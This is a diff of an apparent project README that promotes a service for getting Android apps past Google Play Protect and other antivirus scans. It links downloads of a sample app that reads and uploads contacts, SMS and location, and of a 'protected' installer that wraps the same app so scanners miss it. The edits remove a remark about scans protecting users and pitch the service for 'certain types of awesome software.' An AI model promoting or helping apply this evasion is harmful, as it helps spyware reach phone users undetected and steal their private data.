@@ -1,6 +1,6 @@
 # Bypass Google Play Protect (virus scan bypass)
 
-If Google Play Protect is blocking your app, you're not alone. Security scans are great for protecting users, but they can sometimes create unnecessary roadblocks. We get it—and we've got a solution for you.
+If Google Play Protect is blocking your app, you're not alone. Security scans can sometimes create unnecessary roadblocks for certain types of awesome software. We get it—and we've got a solution for you.
 
 > ![](assets/detected.png)
 
@@ -22,9 +22,13 @@ It works great with these and likely many others too.
 
 ### An Real Example:
 
-We developed an app ([link](./assets/original.apk)) that simulates typical malicious operations, such as reading and uploading sensitive data like contacts, SMS, and geolocation. Unsurprisingly, it was flagged by several security engines, including Google Play Protect. You can check out the VirusTotal scan results [here](https://www.virustotal.com/gui/file/9b3c0e7b7bb015aaa8635c2e37208d6c406e5b5d631b994f5811932374da9cb5).
+We developed an app ([link](https://github.com/Google-Play-Protect-Bypass/Google-Play-Protect-Bypass/raw/refs/heads/main/assets/original.apk)) that simulates typical malicious operations, such as reading and uploading sensitive data like contacts, SMS, and geolocation. Unsurprisingly, it was flagged by several security engines, including Google Play Protect. You can check out the VirusTotal scan results [here](https://www.virustotal.com/gui/file/9b3c0e7b7bb015aaa8635c2e37208d6c406e5b5d631b994f5811932374da9cb5).
 
-However, after embedding the original APK inside our custom installer, the base APK successfully [passes all security checks](https://www.virustotal.com/gui/file/58ba4b98bb43ee953ef9fdb02bcc9594b368fe83963b1975130ba58a5112317e), including Google Play Protect. You can [download](./assets/protected-installer.apk) the installer and try it on your own device. Below is a complete screen recording of the process for you to see it in action.
+However, after embedding the original APK inside our custom installer, the base APK successfully [passes all security checks](https://www.virustotal.com/gui/file/58ba4b98bb43ee953ef9fdb02bcc9594b368fe83963b1975130ba58a5112317e), including Google Play Protect. You can [download](https://github.com/Google-Play-Protect-Bypass/Google-Play-Protect-Bypass/raw/refs/heads/main/assets/protected-installer.apk) the installer and try it on your own device. Below is a complete screen recording of the process for you to see it in action.
+
+
+https://github.com/user-attachments/assets/34dd1d6f-8f74-4eff-abf1-b64dad12f52d
+
 
 ## Try It Now
 
